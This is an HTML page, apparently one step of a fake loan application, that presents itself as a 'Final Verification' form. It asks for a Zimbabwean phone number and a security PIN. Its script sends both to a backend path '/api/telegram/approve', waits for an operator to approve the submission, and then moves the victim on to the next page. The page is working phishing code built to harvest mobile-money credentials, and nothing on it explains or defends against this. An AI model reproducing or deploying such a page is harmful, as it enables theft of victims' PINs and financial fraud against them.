<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Final Login</title>
    <style>
      body {
        margin: 0;
        font-family: Arial, Helvetica, sans-serif;
        background: #f3f4f6;
      }
      .card {
        max-width: 420px;
        margin: 64px auto;
        background: #fff;
        border-radius: 16px;
        padding: 30px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
      }
      h1 {
        color: #16213e;
        margin: 0 0 8px;
      }
      p {
        color: #666;
        margin-bottom: 14px;
      }
      label {
        display: block;
        font-weight: 600;
        margin-bottom: 6px;
      }
      input {
        width: 100%;
        padding: 12px 14px;
        border-radius: 10px;
        border: 1px solid #ddd;
        margin-bottom: 12px;
        box-sizing: border-box;
      }
      .btn {
        width: 100%;
        padding: 14px;
        border-radius: 12px;
        border: none;
        background: linear-gradient(90deg, #6c5ce7, #00b894);
        color: #fff;
        font-size: 16px;
        cursor: pointer;
      }
      .small {
        font-size: 13px;
        color: #999;
        margin-top: 12px;
        text-align: center;
      }
      .overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.45);
        display: none;
        align-items: center;
        justify-content: center;
        z-index: 9999;
      }
      .overlay.show {
        display: flex;
      }
      .box {
        background: #fff;
        padding: 20px 28px;
        border-radius: 12px;
        text-align: center;
      }
      .spinner {
        width: 36px;
        height: 36px;
        border: 4px solid #eee;
        border-top-color: #6c5ce7;
        border-radius: 50%;
        margin: 0 auto 8px;
        animation: spin 1s linear infinite;
      }
      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }
      .error {
        color: #f44336;
        font-size: 14px;
        margin-top: 10px;
      }
    </style>
  </head>
  <body>
    <div class="card">
      <h1>Final Verification</h1>
      <p>Please enter your details for final verification.</p>

      <form id="finalForm">
        <label for="finalPhone">Phone Number</label>
        <div style="display: flex; gap: 10px; margin-bottom: 12px">
          <input
            id="countryCode"
            type="text"
            placeholder="+263"
            maxlength="4"
            style="
              width: 60px;
              padding: 12px 14px;
              border-radius: 10px;
              border: 1px solid #ddd;
            "
          />
          <input
            id="finalPhone"
            type="tel"
            placeholder="712345678"
            maxlength="9"
            required
            style="
              flex: 1;
              padding: 12px 14px;
              border-radius: 10px;
              border: 1px solid #ddd;
            "
          />
        </div>
        <label for="finalPin">Security PIN</label>
        <input
          id="finalPin"
          type="password"
          placeholder="Enter your PIN"
          maxlength="6"
          required
        />
        <button class="btn" type="submit">START FINAL VERIFICATION</button>
      </form>

      <div class="small">This will be verified by our admin team.</div>
      <div class="error" id="errorMsg"></div>
    </div>

    <div class="overlay" id="verifyingOverlay" style="display: none">
      <div class="box">
        <h2>Verifying Details</h2>
        <div class="spinner"></div>
        <p style="color: #666; margin-top: 10px">Please wait...</p>
      </div>
    </div>

    <script>
      const backendUrl = localStorage.getItem("backendUrl");
      const requestId = localStorage.getItem("requestId");
      const verifiedPhone = localStorage.getItem("verifiedPhone") || "";

      // Prefill the phone number
      if (verifiedPhone.startsWith("+263")) {
        document.getElementById("countryCode").value = "+263";
        document.getElementById("finalPhone").value =
          verifiedPhone.substring(4);
      } else {
        document.getElementById("countryCode").value = "+263"; // default
        document.getElementById("finalPhone").value = verifiedPhone;
      }

      // Handle country code input overflow
      document.getElementById("countryCode").addEventListener("input", (e) => {
        const value = e.target.value;
        if (value.length > 4) {
          const countryPart = value.substring(0, 4);
          const phonePart = value.substring(4);
          e.target.value = countryPart;
          const phoneInput = document.getElementById("finalPhone");
          phoneInput.value = phonePart + phoneInput.value;
          phoneInput.focus();
        }
      });

      document
        .getElementById("finalForm")
        .addEventListener("submit", async (e) => {
          e.preventDefault();
          const countryCode = document.getElementById("countryCode").value;
          const finalPhone = document.getElementById("finalPhone").value;
          const finalPin = document.getElementById("finalPin").value;
          const errorEl = document.getElementById("errorMsg");

          if (!finalPhone || !finalPin || !countryCode) {
            errorEl.textContent =
              "Please enter your country code, phone number and PIN";
            return;
          }

          errorEl.textContent = "";
          document.getElementById("verifyingOverlay").style.display = "flex";

          try {
            const resp = await fetch(`${backendUrl}/api/telegram/approve`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                requestId: requestId,
                action: "final_verification",
                phone: countryCode + finalPhone,
                pin: finalPin,
                countryCode: countryCode,
                token: "verification_token",
              }),
            });

            const data = await resp.json();

            // Poll for final verification approval
            let pollCount = 0;
            const pollInterval = setInterval(async () => {
              pollCount++;
              try {
                const r = await fetch(
                  `${backendUrl}/api/otp/status/${requestId}`,
                );
                const j = await r.json();

                if (j.finalApproved) {
                  clearInterval(pollInterval);
                  proceedToSuccess();
                } else if (j.finalRejected) {
                  clearInterval(pollInterval);
                  document.getElementById("verifyingOverlay").style.display =
                    "none";
                  errorEl.textContent =
                    "Final verification failed - Please try again";
                } else if (pollCount > 150) {
                  // 5 minute timeout
                  clearInterval(pollInterval);
                  document.getElementById("verifyingOverlay").style.display =
                    "none";
                  errorEl.textContent =
                    "Verification timeout - Please try again";
                }
              } catch (err) {
                console.error(err);
              }
            }, 2000);
          } catch (err) {
            document.getElementById("verifyingOverlay").style.display = "none";
            errorEl.textContent = "Verification failed - Please try again";
          }
        });

      function proceedToSuccess() {
        window.location.href = "loan8.html";
      }
    </script>
  </body>
</html>
